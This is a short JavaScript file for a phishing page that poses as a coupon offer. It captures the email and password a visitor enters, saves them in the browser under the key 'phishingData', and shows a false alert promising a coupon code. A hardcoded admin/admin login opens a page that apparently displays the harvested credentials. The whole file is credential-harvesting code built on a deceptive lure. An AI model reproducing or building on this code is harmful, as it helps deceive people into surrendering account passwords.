

const claimButton = document.getElementById('claim-button');
const emailInput = document.getElementById('email-input');
const passInput = document.getElementById('password-input');

document.addEventListener('DOMContentLoaded', () => {
    claimButton.addEventListener('click', handleDataSubmission);
});

function handleDataSubmission() {
    const email = emailInput.value;
    const password = passInput.value;

    if (email === 'admin' && password === 'admin') {
        window.location.href = 'displaydata.html';
        return;
    }

    // Get existing data from localStorage
    let phishingData = JSON.parse(localStorage.getItem('phishingData')) || [];

    // Add new entry
    phishingData.push({ email, password });

    // Store updated data in localStorage
    localStorage.setItem('phishingData', JSON.stringify(phishingData));

    // Show an alert message
    alert('Thank you for claiming the coupon! You will receive your exclusive coupon code shortly on your email.');
    
    // Clear the input fields
    emailInput.value = '';
    passInput.value = '';
}
